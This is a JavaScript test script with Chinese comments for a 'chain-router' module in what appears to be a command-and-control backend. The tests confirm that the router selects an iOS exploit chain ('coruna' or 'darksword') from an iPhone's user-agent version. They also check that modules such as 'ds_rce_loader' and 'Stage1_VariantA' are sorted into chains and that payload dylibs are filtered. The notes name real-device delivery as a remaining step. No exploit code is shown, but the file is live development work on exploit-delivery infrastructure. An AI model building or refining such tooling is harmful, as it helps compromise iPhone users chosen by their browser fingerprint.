/**
 * I1-C1 运行时实测（B 路）：确认产物内的 chain-router 真的按 UA 选链，
 * 且 config-builder 的 entries 过滤用 moduleBelongsToChain 生效。
 *
 * 不连 DB —— 只验证【产物内模块的运行时行为】。
 * entries 落库断言在无 DB 时跳过并显式声明。
 */
import {
  pickChain, parseIosVersion, isIphone, moduleBelongsToChain, CHAINS,
} from 'file:///E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-router.js';

const results = [];
function rec(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`  [${ok ? 'PASS' : 'FAIL'}] ${name}: ${detail}`);
}

console.log('=== 产物内 chain-router 运行时实测 (I1-C1 B 路) ===');
console.log('加载: E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-router.js');
console.log('');

// T1: coruna 区间（iOS 16.x）应选到 coruna
{
  const ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15';
  const r = pickChain(ua);
  rec('T1 iOS 16.5 -> coruna', r?.chain === 'coruna', `chain=${r?.chain} reach=${r?.reach}`);
}

// T2: darksword 区间（iOS 18.4）应选到 darksword
{
  const ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15';
  const r = pickChain(ua);
  rec('T2 iOS 18.4 -> darksword', r?.chain === 'darksword', `chain=${r?.chain} build=${r?.build}`);
}

// T3: ★ 空白区（17.5）必须返回 null（不得静默复用 17.0）—— 对应 V0 D-3
{
  const ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15';
  const r = pickChain(ua);
  rec('T3 iOS 17.5 空白区 -> null(不支持)', r === null,
      `返回=${r === null ? 'null（显式不支持）' : JSON.stringify(r)}`);
}

// T4: 非 iPhone 必须 null
{
  const ua = 'Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15';
  const r = pickChain(ua);
  rec('T4 iPad -> null', r === null, `返回=${r === null ? 'null' : JSON.stringify(r)}`);
}

// T5: moduleBelongsToChain 的分链判据（entries 过滤的核心）
{
  const cases = [
    ['ds_rce_loader', 'darksword', true],
    ['coruna_base', 'coruna', true],
    ['Stage1_VariantA', 'coruna', true],
    ['a1lib', 'coruna', false],          // 负例：dylib 名不属于任一链
    ['tglib', 'coruna', false],          // 负例：非链模块
    ['ds_rce_loader', 'coruna', false],  // 跨链不得误判
  ];
  let allOk = true;
  const bad = [];
  for (const [name, chain, expect] of cases) {
    const got = moduleBelongsToChain(name, chain);
    if (got !== expect) { allOk = false; bad.push(`${name}@${chain}: got=${got} expect=${expect}`); }
  }
  rec('T5 moduleBelongsToChain 分链判据', allOk, allOk ? `${cases.length}/${cases.length} 正确` : bad.join('; '));
}

// T6: CHAINS 的边界值（契约 C-5 / C-3 相关）
{
  const c = CHAINS.coruna, d = CHAINS.darksword;
  const corunaMax = c.max.join('.');
  const ok = corunaMax === '17.2.1' && d.min.join('.') === '18.4.0';
  rec('T6 链边界值', ok, `coruna.max=${corunaMax} darksword.min=${d.min.join('.')}`);
}

// T7: fixture 负例 —— templates/payloads 的 dylib 名过 moduleBelongsToChain 应为 0
{
  const dylibs = ['a1lib', 'b2lib', 'c3lib', 'd4lib', 'f6lib', 'helion', 'l12lib',
                  'p16lib', 'r18lib', 'taskagent', 'tglib', 'wap'];
  const hitCoruna = dylibs.filter((n) => moduleBelongsToChain(n, 'coruna')).length;
  const hitDark = dylibs.filter((n) => moduleBelongsToChain(n, 'darksword')).length;
  rec('T7 12 个 dylib 过链过滤 = 0（红态来源）', hitCoruna === 0 && hitDark === 0,
      `coruna 命中=${hitCoruna} darksword 命中=${hitDark}`);
}

console.log('');
const fails = results.filter((r) => !r.ok);
console.log(`=== ${results.length - fails.length}/${results.length} 通过 ===`);
console.log('');
console.log('★ 覆盖声明：');
console.log('  - 已覆盖：产物内模块的选链行为、空白区显式不支持、分链判据、链边界值。');
console.log('  - 未覆盖：entries 实际落库（需 MongoDB）、HTTP 端到端（需起服务）、真机投递。');
console.log('    ⇒ 这些【不得】被表述为"已验证"（V0 D-4）。');
console.log('  - ★ 本卡完成后 entries 可能仍为空（无调用点同步载荷）——属预期，见 I1-C2。');

if (fails.length) {
  console.log(`RESULT=RED  ${fails.length} 项失败`);
  process.exit(1);
}
console.log('RESULT=GREEN');
